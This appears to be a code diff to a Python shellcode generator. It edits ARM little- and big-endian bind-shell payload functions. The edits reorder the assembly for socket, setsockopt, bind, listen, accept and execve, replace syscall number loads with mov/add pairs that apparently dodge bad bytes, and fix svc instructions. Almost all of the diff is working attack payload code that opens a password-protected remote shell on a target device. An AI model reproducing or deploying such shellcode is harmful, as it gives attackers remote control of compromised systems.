@@ -2116,9 +2116,6 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 		add r10,sp,#-0x1d
 		add r5,sp,#-0x2c
 		add r8,sp,#-0x20
-		add r3,pc,#1
-		bx  r3
-		.THUMB
 		main:
 		'''
 	elif shell_path == "/bin/sh" or shell_path == "sh":
@@ -2156,9 +2153,6 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	add r10,sp,#-0x1b
 	add r5,sp,#-0x2c
 	add r8,sp,#-0x20
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	main:
 	'''
 	else:
@@ -2182,7 +2176,8 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
     mov  r1, #1
     eor  r2, r2 ,r2/* 0 (#0) */
     /* call socket() */
-    mov r7, #SYS_socket /* 0x119 */
+    mov r7, #0xff /* 0x119 */
+    add r7,r7,0x1a
     svc  #0
 	'''
 
@@ -2198,7 +2193,8 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	mov  r3, sp
 	mov  r4, #4
 	/* call setsockopt() */
-	mov r7, #SYS_setsockopt /* 0x126 */
+	mov r7, #0xff
+	add r7, r7,#39
 	svc  0
 	'''
 
@@ -2211,15 +2207,18 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	shellcode +='''
 	mov  r1,sp
 	mov  r2,#0x10  
-	movw r7, 0x11a
+	mov r7,#0xff
+	add r7,r7,0x1b
 	svc #0
 	mov r0,r6
 	eor r1,r1
-	movw r7,#284
+	mov r7,#0xff
+	add r7,r7,29
 	svc #0
 	mov r0,r6
 	eor r2,r2
-	movw r7, 0x11d
+	mov r7, #0xff
+	add r7,r7,30
 	svc #0
 	mov r6,r0
 
@@ -2284,7 +2283,7 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 	'''
 	shellcode = shellcode % (passwd_len)
 
@@ -2418,9 +2417,6 @@ def armebv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	add r8,sp,#-0x20
 	add r10,sp,#-0x1b
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	main:
 	'''
 
@@ -2463,9 +2459,6 @@ def armebv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 		add r10,sp,#-0x1d
 		add r5,sp,#-0x2c
 		add r8,sp,#-0x20
-		add r3,pc,#1
-		bx  r3
-		.THUMB
 		main:
 		'''
 	else:
@@ -2488,8 +2481,8 @@ def armebv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	mov  r0, #2
     mov  r1, #1
     eor  r2, r2 ,r2/* 0 (#0) */
-    /* call socket() */
-    mov r7, #SYS_socket /* 0x119 */
+    mov r7, #0xff /* 0x119 */
+    add r7,r7,0x1a
     svc  #0
 	'''
 
@@ -2520,15 +2513,18 @@ def armebv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	shellcode +='''
 	mov  r1,sp
 	mov  r2,#0x10  
-	mov r7, 0x11a
+	mov r7,#0xff
+	add r7,r7,0x1b
 	svc #0
 	mov r0,r6
 	eor r1,r1
-	mov r7,#284
+	mov r7,#0xff
+	add r7,r7,29
 	svc #0
 	mov r0,r6
 	eor r2,r2
-	mov r7, 0x11d
+	mov r7, #0xff
+	add r7,r7,30
 	svc #0
 	mov r6,r0
 
@@ -2599,7 +2595,7 @@ def armebv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 	'''
 
 	shellcode += '''
@@ -2819,11 +2815,11 @@ def powerpc_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 
 
 
-def sparc_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
+def sparc_power_bind_shell(shell_path ,listen_port, passwd, envp ,sleep_time,filename=None):
 	pass
 
 
-def spac64_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
+def spac64_power_bind_shell(shell_path ,listen_port, passwd, envp ,sleep_time ,filename=None):
 	pass
 
 
